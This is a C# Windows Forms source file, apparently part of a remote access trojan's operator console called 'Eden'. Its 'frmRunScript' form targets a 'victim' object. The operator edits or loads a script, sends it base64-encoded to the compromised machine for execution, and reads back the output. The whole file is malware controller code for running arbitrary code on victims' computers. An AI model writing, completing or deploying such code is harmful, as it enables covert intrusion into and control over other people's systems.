using ICSharpCode.TextEditor;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmRunScript : Form
    {
        public clsVictim m_victim { get; init; }
        private TextEditorControl editor = new TextEditorControl();

        public frmRunScript(clsVictim victim)
        {
            InitializeComponent();

            m_victim = victim;
            Text = $@"RunScript\\{victim.m_szID}";
        }

        void fnRecv(clsClient clnt, string szVictimID, List<string> lsMsg)
        {
            if (!string.Equals(szVictimID, m_victim.m_szID))
                return;

            if (lsMsg[0] == "exec")
            {
                if (lsMsg[1] == "code")
                {
                    int nCode = int.Parse(lsMsg[2]);
                    string szOutput = lsMsg[3];

                    Invoke(new Action(() =>
                    {
                        richTextBox1.AppendText($"[{DateTime.Now.ToString("F")}] {(nCode == 1 ? "Run code successfully:" : "Run code failed:")}");
                        richTextBox1.AppendText(Environment.NewLine);
                        richTextBox1.AppendText(szOutput);
                        richTextBox1.AppendText(Environment.NewLine);
                    }));
                }
            }
        }

        void fnSetup()
        {
            m_victim.m_clnt.ServerMessageReceived += fnRecv;

            splitContainer1.Panel1.Controls.Add(editor);
            editor.Dock = DockStyle.Fill;

            editor.Text = string.Empty;
            editor.Refresh();
        }

        private void frmRunScript_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    editor.Text = File.ReadAllText(ofd.FileName);
                    editor.Refresh();
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, editor.Text);
                    MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    File.WriteAllText(sfd.FileName, richTextBox1.Text);
                    MessageBox.Show("Save file successfully: " + sfd.FileName, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            richTextBox1.Clear();
        }

        private void frmRunScript_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_clnt.ServerMessageReceived -= fnRecv;
        }

        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            m_victim.fnSendCommand(new string[]
            {
                "RunScript",
                "code",
                EZCrypto.Encoder.stre2b64(editor.Text),
            });
        }
    }
}
